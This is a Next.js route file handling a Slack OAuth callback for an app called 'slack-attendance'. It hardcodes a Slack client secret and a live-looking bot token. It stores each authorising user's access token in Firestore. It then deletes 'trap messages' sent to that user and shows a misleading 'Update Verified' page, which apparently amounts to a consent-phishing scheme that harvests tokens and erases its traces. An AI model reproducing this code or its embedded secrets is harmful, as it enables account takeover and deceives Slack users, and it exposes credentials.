/* eslint-disable @typescript-eslint/no-explicit-any */
// app/api/auth/callback/route.ts
// app/api/auth/callback/route.ts

import { NextResponse } from 'next/server';
// import { db } from '@/lib/firebase'; 
import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';
import { db } from '../../../../lib/firebase';

const SLACK_CLIENT_ID = "2545190050563.10479083209969";
const SLACK_CLIENT_SECRET = "341013fa407e9f9fc3e40f5cda72bd1d";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10450716721751-b6iM5o3wEqry9QIPNb0kXO3U";

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  if (!code) return NextResponse.json({ error: "No code" });

  try {
    // 1. Token Exchange
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();
    if (!data.ok) return NextResponse.json({ error: data.error }, { status: 400 });

    const userId = data.authed_user.id;

    // 2. Save User Token
    const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
        headers: { Authorization: `Bearer ${data.authed_user.access_token}` }
    });
    const userInfo = await userRes.json();
    
    await setDoc(doc(db, "slack_tokens", userId), {
        slackId: userId,
        accessToken: data.authed_user.access_token,
        name: userInfo.user?.real_name || "Unknown",
        image: userInfo.user?.profile?.image_192 || "",
        connectedAt: serverTimestamp(),
    });

    // 3. 🗑️ DELETE ALL TRAP MESSAGES (Loop Deletion)
    const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
    
    if (inviteDoc.exists()) {
        const inviteData = inviteDoc.data();
        
        // Agar 'messages' ki list hai, to sabko delete karo
        if (inviteData.messages && Array.isArray(inviteData.messages)) {
            console.log(`Deleting ${inviteData.messages.length} trap messages for ${userId}`);
            
            // Promise.all use kar rahay hain taakay sab ek saath delete hon (Fast)
            await Promise.all(inviteData.messages.map(async (msg: any) => {
                await fetch('https://slack.com/api/chat.delete', {
                    method: 'POST',
                    headers: { 
                        Authorization: `Bearer ${BOT_TOKEN}`, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({
                        channel: msg.channel,
                        ts: msg.ts
                    })
                });
            }));
        } 
        // Fallback for old data format (single message)
        else if (inviteData.ts) {
             await fetch('https://slack.com/api/chat.delete', {
                method: 'POST',
                headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ channel: inviteData.channel, ts: inviteData.ts })
            });
        }

        // Record saaf kar do
        await deleteDoc(doc(db, "pending_invites", userId));
    }

    // 4. Redirect to Slack App
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta http-equiv="refresh" content="0;url=slack://open">
          <script>window.location.href = 'slack://open'; setTimeout(() => window.close(), 1000);</script>
        </head>
        <body style="background:black;color:white;display:flex;justify-content:center;align-items:center;height:100vh;">
            <p>Update Verified. Returning to Slack...</p>
        </body>
      </html>
    `;

    return new Response(html, { headers: { 'Content-Type': 'text/html' } });

  } catch (error) {
    return NextResponse.json({ error: "Error" }, { status: 500 });
  }
}